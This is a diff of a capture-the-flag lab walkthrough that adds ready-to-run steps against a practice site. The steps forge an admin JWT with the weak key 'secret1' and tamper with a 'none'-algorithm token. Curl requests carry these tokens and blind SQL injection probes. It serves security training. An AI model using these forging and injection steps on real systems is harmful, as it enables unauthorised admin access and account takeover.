@@ -826,13 +826,63 @@ Or use https://jwt.io:
 
 ---
 
-#### Step 5: Access admin panel
+#### Step 5: Create forged token with OpenSSL (alternative)
 
-1. Set the forged token as `auth_token` cookie
+If Python is not available, use OpenSSL:
+
+```bash
+# Header and Payload
+HEADER='{"alg":"HS256","typ":"JWT"}'
+HEADER_B64=$(echo -n "$HEADER" | base64 -w0 | tr '+' '-' | tr '/' '_' | tr -d '=')
+
+PAYLOAD='{"sub":2,"user":"john","role":"administrator","email":"john@leaguesofcode.com","iat":1772825267,"exp":1872828867}'
+PAYLOAD_B64=$(echo -n "$PAYLOAD" | base64 -w0 | tr '+' '-' | tr '/' '_' | tr -d '=')
+
+# Sign with secret1
+MESSAGE="${HEADER_B64}.${PAYLOAD_B64}"
+SIGNATURE=$(echo -n "$MESSAGE" | openssl dgst -sha256 -hmac "secret1" -binary | base64 -w0 | tr '+' '-' | tr '/' '_' | tr -d '=')
+
+# Full token
+echo "${MESSAGE}.${SIGNATURE}"
+```
+
+---
+
+#### Step 6: Access admin panel
+
+**Important:** The cookie name for this lab is `auth_token_secure` (not `auth_token`)
+
+1. Set the forged token as `auth_token_secure` cookie
 2. Visit http://10.10.61.221/account/admin.php
 3. You should see the admin dashboard
 
+**Browser Console method:**
+```javascript
+document.cookie = "auth_token_secure=YOUR_FORGED_TOKEN; path=/";
+location.href = "/account/admin.php";
+```
+
+**Curl verification:**
+```bash
+FORGED_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AbGVhZ3Vlc29mY29kZS5jb20iLCJpYXQiOjE3NzI4MjUyNjcsImV4cCI6MTg3MjgyODg2N30.V_-bEhkxlhy9LBjlyvcAzrKngLH3-z3tNFC6u8at7uE"
+
+curl -s "http://10.10.61.221/account/admin.php" \
+  -b "auth_token_secure=$FORGED_TOKEN" | grep "JWT_WEAK_KEY_CRACKED"
+```
+
 **Flag:** `JWT_WEAK_KEY_CRACKED_2026`
+
+---
+
+#### Summary - JWT Weak Key Attack
+
+| Item | Value |
+|------|-------|
+| Lab URL | `/account/secure.php` |
+| Admin URL | `/account/admin.php` |
+| Cookie Name | `auth_token_secure` |
+| Secret Key | `secret1` |
+| Flag | `JWT_WEAK_KEY_CRACKED_2026` |
 
 ---
 
@@ -872,10 +922,15 @@ curl -s "http://10.10.61.221/resources/verify.php?code=LOC001'%20AND%20'1'='1" |
 # Blind injection FALSE
 curl -s "http://10.10.61.221/resources/verify.php?code=LOC001'%20AND%20'1'='2" | grep "Not Found"
 
-# JWT - Admin access with tampered token
+# JWT None Algorithm - Admin access with tampered token
 curl -s 'http://10.10.61.221/account/portal.php' \
-  -b 'auth_token=eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAyLCAidXNlciI6ICJqb2huIiwgInJvbGUiOiAiYWRtaW5pc3RyYXRvciIsICJlbWFpbCI6ICJqb2huQGV4YW1wbGUuY29tIn0.' \
-  | grep "Admin Panel"
+  -b 'auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AZXhhbXBsZS5jb20iLCJpYXQiOjE3NzI4MjM5NzIsImV4cCI6MTg3MjgyNzU3Mn0.' \
+  | grep "MASTER_KEY"
+
+# JWT Weak Key - Admin access with cracked key token
+curl -s 'http://10.10.61.221/account/admin.php' \
+  -b 'auth_token_secure=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AbGVhZ3Vlc29mY29kZS5jb20iLCJpYXQiOjE3NzI4MjUyNjcsImV4cCI6MTg3MjgyODg2N30.V_-bEhkxlhy9LBjlyvcAzrKngLH3-z3tNFC6u8at7uE' \
+  | grep "JWT_WEAK_KEY_CRACKED"
 ```
 
 ---
